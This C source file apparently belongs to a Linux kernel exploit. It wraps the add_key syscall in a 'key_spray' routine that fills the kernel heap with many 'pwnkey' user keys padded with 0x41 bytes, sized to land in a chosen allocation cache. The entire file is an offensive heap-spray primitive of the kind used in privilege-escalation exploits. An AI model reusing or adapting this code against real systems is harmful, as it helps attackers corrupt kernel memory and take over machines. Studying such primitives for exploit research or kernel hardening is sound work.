#include "key.h"

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>

key_serial_t add_key(const char *type, const char *description,
                            void *payload, size_t plen,
                            key_serial_t keyring)
{
    return syscall(SYS_add_key, type, description, payload, plen, keyring);
}

void _keyspray(char *description, void *payload, size_t plen, size_t count, int *kid){
    for (size_t i = 0; i < count; i++){
        kid[i] = add_key("user", description, payload, plen, KEY_SPEC_THREAD_KEYRING);
        if (kid[i] < 0){
            perror("[-] add_key");
        }
    }
}

void key_spray(size_t plen, size_t count, int *kid){
    char *desc = "pwnkey";
    char payload[plen];
    memset(payload, 0x41, plen);
    _keyspray(desc, payload, plen-sizeof(struct user_key_payload), count, kid);
}